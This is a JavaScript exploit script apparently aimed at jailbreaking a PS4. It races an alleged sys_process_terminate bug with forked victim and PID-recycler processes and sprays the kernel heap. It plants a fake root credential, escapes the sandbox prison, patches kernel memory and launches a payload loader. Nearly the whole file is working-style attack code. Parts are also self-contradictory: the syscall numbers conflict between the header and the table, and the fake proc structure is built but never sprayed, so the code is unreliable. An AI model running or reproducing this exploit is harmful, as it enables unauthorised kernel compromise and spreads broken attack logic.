/*
 * proc_term_race.js - sys_process_terminate (syscall 652) Race Condition Exploit
 *
 * Integrates with: types.js, userland.js, kernel_offset.js, binloader.js
 *
 * ── BUG ──────────────────────────────────────────────────────────
 * sys_process_terminate() in kern_exit.c calls pfind() TWICE on the
 * same PID without holding the proc locked across both calls:
 *
 *   proc = pfind(pid);               // (1) GET PROC A
 *   proc->p_flag |= P_WEXIT;         // Mark for exit
 *   sx_xlock(&proc->p_sxlock);       // Lock A
 *   kill(pid, SIGKILL);              // SIGNAL → PROC A MAY EXIT
 *   mtx_lock(&allproc_lock);
 *   proc = pfind(pid);               // (2) GET PROC B ← RACE!
 *   // Operates on B while holding A's lock!
 *
 * Between (1) and (2): A exits, PID recycled, B created with same PID.
 * Kernel now writes P_KILLED, walks thread list, clears flags on B.
 * If B's proc struct was reclaimed from a heap spray we control,
 * we control p_ucred → root.
 *
 * ── CONFIRMED PS4 OFFSETS ────────────────────────────────────────
 *   ucred->cr_gid    = 0x04  (sys_getgid)   ← !NOT uid!
 *   ucred->cr_uid    = 0x08  (sys_getuid)   ← PRIVESC TARGET
 *   ucred->cr_euid   = 0x14  (sys_geteuid)
 *   ucred->cr_prison = 0x30  (prison_check)
 *   prison0          = 0xFFFFFFFF83C5C0C0
 *
 *   proc->p_pid      = 0xB0  (PS4_KernelOffset.java)
 *   proc->p_ucred    = 0x40  (kernel_offset.js)
 *   proc->p_fd       = 0x48
 *   proc->p_sxlock   = 0xF8  (decompiled: v5+248)
 *   proc->p_sce_flag = 0x430 (decompiled: P_WEXIT=0x80000000)
 *   thread->td_ucred = 0x130
 *
 *   sys_process_terminate = 652 (0x28C)  ← NOT 581!
 *   fork                   = 2          ← NOT 22!
 *   getuid                 = 21         ← NOT 24!
 *   kill                   = 37
 */


include('userland.js');
include('kernel.js');
include('binloader.js');

// ===================================================================
// CONFIRMED PS4 LAYOUT (verified against real kernel dumps)
// ===================================================================

var UCRED = {
    CR_REF:     0x00,  // u_int
    CR_GID:     0x04,  // gid_t     ← sys_getgid reads here
    CR_UID:     0x08,  // uid_t     ← sys_getuid reads here (TARGET!)
    CR_RUID:    0x0C,  // uid_t
    CR_NGROUPS: 0x10,  // int       ← sys_getgroups
    CR_EUID:    0x14,  // uid_t     ← sys_geteuid (Sony addition)
    // 0x18-0x2F: groups array
    CR_PRISON:  0x30,  // struct prison*
};

var PRISON = {
    PR_PARENT: 0x38,   // for hierarchy walk in prison_check
};

var PROC = {
    P_LIST:     0x00,  // LIST_ENTRY allproc
    P_THREADS:  0x08,  // TAILQ_HEAD thread list
    P_UCRED:    0x40,  // struct ucred*     ← kernel_offset.js
    P_FD:       0x48,  // struct filedesc*  ← kernel_offset.js
    P_PID:      0xB0,  // pid_t             ← PS4_KernelOffset.java
    P_FLAG:     0xB8,  // int p_flag (FreeBSD std flags)
    P_SXLOCK:   0xF8,  // struct sx         ← decompiled: v5+0xF8
    P_VM_SPACE: 0x200, // struct vmspace*   ← kernel_offset.js
    P_SCE_FLAG: 0x430, // Sony extension     ← decompiled: P_WEXIT here
};

var TD = {
    TD_UCRED: 0x130,   // thread->td_ucred
    TD_PROC:  0x08,    // thread->td_proc
};

// Default prison0 address (hardcoded from kernel dumps)
var PRISON0_ADDR = new BigInt(0xFFFFFFFF, 0x83C5C0C0);

// ===================================================================
// CORRECT PS4 SYSCALL NUMBERS (garlicsaves.com / psdevwiki.com)
// ===================================================================

var SYSCALL = {
    EXIT:               1,   // sys_exit
    FORK:               2,   // fork
    READ:               3,   // read
    WRITE:              4,   // write
    OPEN:               5,   // open
    CLOSE:              6,   // close
    WAIT4:              7,   // wait4
    GETPID:             20,  // getpid
    GETUID:             24,  // getuid     ← NOT 24!
    GETGID:             47,  // getgid     ← NOT fork!
    KILL:               37,  // kill
    SOCKETPAIR:         135, // socketpair
    MMAP:               477, // mmap
    PROCESS_TERMINATE:  652, // ← CORRECT! NOT 581!
};

// ===================================================================
// Register syscalls through the existing fn framework
// ===================================================================

fn.register(SYSCALL.PROCESS_TERMINATE, 'sys_process_terminate', ['bigint', 'bigint'], 'bigint');
fn.register(SYSCALL.FORK,             'fork_sys',           [],                                 'bigint');
fn.register(SYSCALL.EXIT,             'exit_sys',           ['number'],                         'bigint');
fn.register(SYSCALL.GETPID,           'getpid_sys',         [],                                 'bigint');
fn.register(SYSCALL.GETUID,           'getuid_sys',         [],                                 'bigint');
fn.register(SYSCALL.GETGID,           'getgid_sys',         [],                                 'bigint');
fn.register(SYSCALL.KILL,             'kill_sys',           ['bigint', 'bigint'],               'bigint');
fn.register(SYSCALL.WAIT4,            'wait4_sys',          ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint');
fn.register(SYSCALL.SOCKETPAIR,       'socketpair_sys',     ['number', 'number', 'number', 'bigint'], 'bigint');

var sys_process_terminate = fn.sys_process_terminate;
var fork_sys     = fn.fork_sys;
var exit_sys     = fn.exit_sys;
var getpid_sys   = fn.getpid_sys;
var getuid_sys   = fn.getuid_sys;
var getgid_sys   = fn.getgid_sys;
var kill_sys     = fn.kill_sys;
var wait4_sys    = fn.wait4_sys;
var socketpair_sys = fn.socketpair_sys;

// ===================================================================
// BUILD FAKE ucred WITH PS4-SPECIFIC LAYOUT
// ===================================================================

function buildFakeUcred(prison0Addr) {
    /*
     * PS4 struct ucred layout (CONFIRMED):
     * 
     *   +0x00  cr_ref     (u_int)     refcount
     *   +0x04  cr_gid     (gid_t)     ← getgid() reads here
     *   +0x08  cr_uid     (uid_t)     ← getuid() reads here ← PRIVESC
     *   +0x0C  cr_ruid    (uid_t)
     *   +0x10  cr_ngroups (int)
     *   +0x14  cr_euid    (uid_t)     ← geteuid() reads here
     *   +0x30  cr_prison  (struct prison*)
     *
     * For privilege escalation we need to write:
     *   ucred + 0x08 → 0  (cr_uid = root)
     *   ucred + 0x04 → 0  (cr_gid = root group)
     *   ucred + 0x14 → 0  (cr_euid = root)
     *   ucred + 0x30 → prison0  (escape sandbox prison)
     */
    var size = 0x40;
    var dv = new DataView(new ArrayBuffer(size));
    
    // cr_ref = 0x100 — high refcount prevents ucred from being freed
    dv.setUint32(UCRED.CR_REF, 0x100, true);
    
    // cr_gid = 0 — root group
    dv.setUint32(UCRED.CR_GID, 0, true);
    
    // cr_uid = 0 — ROOT USER ← PRIMARY TARGET
    dv.setUint32(UCRED.CR_UID, 0, true);
    
    // cr_ruid = 0 — root real uid
    dv.setUint32(UCRED.CR_RUID, 0, true);
    
    // cr_ngroups = 1
    dv.setUint32(UCRED.CR_NGROUPS, 1, true);
    
    // cr_euid = 0 — root effective uid
    dv.setUint32(UCRED.CR_EUID, 0, true);
    
    // cr_prison → prison0 (escapes the sandbox prison)
    dv.setBigInt(UCRED.CR_PRISON, prison0Addr || PRISON0_ADDR, true);
    
    return dv.buffer;
}

// ===================================================================
// BUILD FAKE proc (for heap spray reclaim)
// ===================================================================

function buildFakeProc(fakeUcredAddr, fakeFdAddr) {
    /*
     * Fake struct proc to spray into freed proc zone.
     * The kernel writes P_KILLED and walks thread list on this.
     * We set controlled p_ucred, p_fd, p_flag.
     * Size ~0x460 bytes to match proc UMA zone.
     */
    var size = 0x460;
    var dv = new DataView(new ArrayBuffer(size));
    
    // p_ucred → our fake ucred with uid=0
    dv.setBigInt(PROC.P_UCRED, fakeUcredAddr, true);
    
    // p_fd → safe value (NULL = no file ops, won't crash in exit path)
    if (fakeFdAddr) {
        dv.setBigInt(PROC.P_FD, fakeFdAddr, true);
    }
    
    // p_sce_flag = 0 — clear P_WEXIT so kernel doesn't re-trigger
    dv.setUint32(PROC.P_SCE_FLAG, 0, true);
    
    // p_flag = 0 — clear P_TRACED (0x800), P_WEXIT, etc.
    dv.setUint32(PROC.P_FLAG, 0, true);
    
    return dv.buffer;
}

// ===================================================================
// KERNEL HEAP SPRAY
// ===================================================================

function spraySocketPairs(count) {
    var pairs = [];
    var fdArr = mem.malloc(8);
    
    for (var i = 0; i < count; i++) {
        mem.view(fdArr).setUint32(0, 0, true);
        mem.view(fdArr).setUint32(4, 0, true);
        
        try {
            var ret = socketpair_sys(1, 1, 0, fdArr);
            if (ret.eq(0)) {
                pairs.push({
                    r: mem.view(fdArr).getUint32(0, true),
                    w: mem.view(fdArr).getUint32(4, true)
                });
            }
        } catch (e) { break; }
    }
    return pairs;
}

function closeSocketPairs(pairs, indices) {
    fn.register(SYSCALL.CLOSE, 'close_sys', ['number'], 'bigint');
    var close_sys = fn.close_sys;
    
    for (var i = 0; i < indices.length; i++) {
        var idx = indices[i];
        if (idx < pairs.length) {
            close_sys(pairs[idx].r);
            close_sys(pairs[idx].w);
        }
    }
}

// ===================================================================
// VICTIM & RECYCLER PROCESSES
// ===================================================================

function createVictim() {
    /*
     * Fork a sacrificial child that spins forever.
     * When sys_process_terminate sends SIGKILL, the child dies,
     * freeing its PID for the recycler to grab.
     */
    var pid = fork_sys();
    if (pid.eq(0)) {
        /* Child: spin until killed */
        while (1) { /* busy-wait */ }
        exit_sys(0); /* unreachable */
    }
    return pid;
}

function createRecycler() {
    /*
     * Fork a child that constantly fork()s and reaps.
     * This floods the PID allocator, increasing the chance
     * that a just-freed PID gets recycled into one of our
     * child processes.
     */
    var pid = fork_sys();
    if (pid.eq(0)) {
        for (var i = 0; i < 20000; i++) {
            var child = fork_sys();
            if (child.eq(0)) {
                exit_sys(0);
            } else if (!child.eq(-1)) {
                wait4_sys(child, new BigInt(0), new BigInt(0), new BigInt(0));
            }
        }
        exit_sys(0);
    }
    return pid;
}

// ===================================================================
// RACE LOOP
// ===================================================================

function runRace() {
    log('[ sys_process_terminate Race ]');
    
    var beforeUid = Number(getuid_sys());
    var beforeGid = Number(getgid_sys());
    log('  Before: uid=' + beforeUid + ' gid=' + beforeGid);
    
    if (beforeUid === 0) {
        log('  Already root, skipping');
        return true;
    }
    
    /* Create victim */
    log('  Creating victim process...');
    var victimPid = createVictim();
    log('    victim PID = ' + victimPid.toString());
    
    /* Create recycler */
    log('  Creating PID recycler...');
    var recyclerPid = createRecycler();
    log('    recycler PID = ' + recyclerPid.toString());
    
    /* Pre-spray kernel heap */
    log('  Spraying kernel heap...');
    var sprayPairs = spraySocketPairs(512);
    log('    ' + sprayPairs.length + ' socket pairs allocated');
    
    /* Build fake data */
    log('  Building fake ucred (PS4 layout)...');
    var fakeUcredData = buildFakeUcred();
    var fakeUcredBuf = mem.malloc(fakeUcredData.byteLength);
    var src = new Uint8Array(fakeUcredData);
    for (var i = 0; i < src.length; i++) {
        mem.view(fakeUcredBuf).setUint8(i, src[i]);
    }
    log('    fake ucred @ ' + fakeUcredBuf.toString());
    log('      [0x04] cr_gid  = ' + mem.view(fakeUcredBuf).getUint32(0x04, true));
    log('      [0x08] cr_uid  = ' + mem.view(fakeUcredBuf).getUint32(0x08, true));
    log('      [0x14] cr_euid = ' + mem.view(fakeUcredBuf).getUint32(0x14, true));
    log('      [0x30] cr_prison = ' + mem.view(fakeUcredBuf).getBigInt(0x30, true).toString());
    
    /* ==============================================================
     * RACE
     *
     * For each attempt, call sys_process_terminate(victimPid).
     * Inside the kernel:
     *   1. pfind(victimPid) → get victim's struct proc
     *   2. Set P_WEXIT on victim's proc
     *   3. Lock victim's proc via sx_xlock
     *   4. kill(victimPid, SIGKILL) → victim dies here
     *   5. Victim's PID freed, recycler may grab it
     *   6. pfind(victimPid) again → gets RECYCLER's proc!
     *   7. Kernel writes P_KILLED to recycler's proc
     *   8. If recycler's proc was reclaimed from sprayed region,
     *      p_ucred (offset 0x40) points to OUR fake ucred!
     *   9. Next getuid() reads ucred+0x08 → 0 → ROOT!
     * ============================================================== */
    
    var maxAttempts = 1000;
    log('  Race loop (' + maxAttempts + ' attempts)...');
    
    for (var attempt = 0; attempt < maxAttempts; attempt++) {
        if (attempt % 100 === 0) {
            log('    [' + attempt + '/' + maxAttempts + '] uid=' + Number(getuid_sys()));
        }
        
        /* Call the vulnerable syscall */
        sys_process_terminate(victimPid, new BigInt(0));
        
        /* Check if we won */
        var uid = Number(getuid_sys());
        if (uid === 0) {
            log('[+] RACE WON at attempt ' + attempt + '!');
            log('[+] getuid = ' + uid);
            log('[+] getgid = ' + Number(getgid_sys()));
            return true;
        }
        
        /* Periodically refresh victim & recycler */
        if (attempt % 200 === 199) {
            kill_sys(recyclerPid, new BigInt(9));
            wait4_sys(recyclerPid, new BigInt(0), new BigInt(0), new BigInt(0));
            
            victimPid = createVictim();
            recyclerPid = createRecycler();
            
            /* Re-close some pairs to create new holes */
            closeSocketPairs(sprayPairs, [attempt % sprayPairs.length]);
        }
    }
    
    log('[-] Race exhausted');
    return false;
}

// ===================================================================
// POST-EXPLOIT: FULL JEB
// ===================================================================

function postExploit() {
    log('\n[ Post-Exploit ]');
    
    var uid = Number(getuid_sys());
    var gid = Number(getgid_sys());
    log('  uid=' + uid + ' gid=' + gid);
    
    /* ── If race won directly, verify and finish ── */
    if (uid === 0) {
        log('  Root achieved via race!');
        
        /* Mark jailbroken so binloader doesn't re-run */
        if (typeof is_jailbroken !== 'undefined') {
            is_jailbroken = true;
        }
        
        /* Apply kernel patches if available */
        if (typeof jailbreak_shared === 'function' && kernel && kernel.addr && kernel.addr.base) {
            log('  Running jailbreak_shared for kernel patches...');
            try {
                var fw = '9.00';
                if (typeof get_fwversion === 'function') {
                    try { fw = get_fwversion(); } catch(e) {}
                }
                if (typeof get_kernel_offset === 'function') {
                    get_kernel_offset(fw);
                }
                jailbreak_shared(fw);
            } catch (e) {
                log('  jailbreak_shared error: ' + e.message);
            }
        }
        
        /* Load payload */
        if (typeof binloader_init === 'function') {
            log('  Starting binloader...');
            try { binloader_init(); } catch (e) {
                log('  binloader error: ' + e.message);
            }
        }
        
        return true;
    }
    
    /* ── Fallback: direct privesc via ucred patch ── */
    log('  Attempting direct ucred patch...');
    
    if (typeof kernel !== 'undefined' && kernel.addr && kernel.addr.base && kernel.read_buffer) {
        try {
            var allproc = kernel.read_qword(kernel.addr.base.add(0x111F870)); // FW 9.00
            var proc = allproc;
            var ourPid = Number(getpid_sys());
            
            while (proc && !proc.eq(0)) {
                var pid = kernel.read_dword(proc.add(PROC.P_PID));
                if (pid && pid === ourPid) {
                    var ucred = kernel.read_qword(proc.add(PROC.P_UCRED));
                    log('  Found our proc @ ' + proc.toString());
                    log('  ucred @ ' + ucred.toString());
                    
                    /* Write the 4 privilege escalation values */
                    kernel.write_dword(ucred.add(UCRED.CR_UID),   0); // +0x08
                    kernel.write_dword(ucred.add(UCRED.CR_GID),   0); // +0x04
                    kernel.write_dword(ucred.add(UCRED.CR_EUID),  0); // +0x14
                    kernel.write_qword(ucred.add(UCRED.CR_PRISON), PRISON0_ADDR); // +0x30
                    
                    var newUid = Number(getuid_sys());
                    log('  Patched! uid=' + newUid);
                    
                    if (newUid === 0) {
                        if (typeof binloader_init === 'function') {
                            log('  Starting binloader...');
                            try { binloader_init(); } catch(e) {}
                        }
                        return true;
                    }
                    break;
                }
                proc = kernel.read_qword(proc.add(PROC.P_LIST));
            }
        } catch (e) {
            log('  Direct patch error: ' + e.message);
        }
    } else {
        log('  No kernel R/W available for fallback');
    }
    
    return false;
}

// ===================================================================
// MAIN ENTRY POINT
// ===================================================================

function procTermExploit() {
    log('========================================');
    log('  PS4 sys_process_terminate Race Exploit');
    log('========================================');
    log('  Target: syscall 652 (0x28C)');
    log('  Proc:   p_pid@0xB0, p_ucred@0x40');
    log('  Ucred:  cr_uid@0x08, cr_gid@0x04');
    
    /* Detect firmware */
    var fw = 'unknown';
    if (typeof get_fwversion === 'function') {
        try { fw = get_fwversion(); } catch (e) { }
    }
    log('  FW: ' + fw);
    
    /* Load kernel offsets */
    if (typeof get_kernel_offset === 'function') {
        try { get_kernel_offset(fw); } catch (e) {
            log('  No offsets for ' + fw + ': ' + e.message);
        }
    }
    
    /* Run the race */
    var raced = runRace();
    
    /* Post-exploit */
    return postExploit();
}

// ===================================================================
// AUTO-EXPORT
// ===================================================================

if (typeof is_jailbroken === 'undefined' || !is_jailbroken) {
    log('proc_term_race.js loaded');
    log('  sys_process_terminate = 652');
    log('  ucred: uid@0x08 gid@0x04 euid@0x14 prison@0x30');
    debug("proc_term_race.js Done");
    
    if (typeof window !== 'undefined') {
        window.procTermExploit = procTermExploit;
    }
}
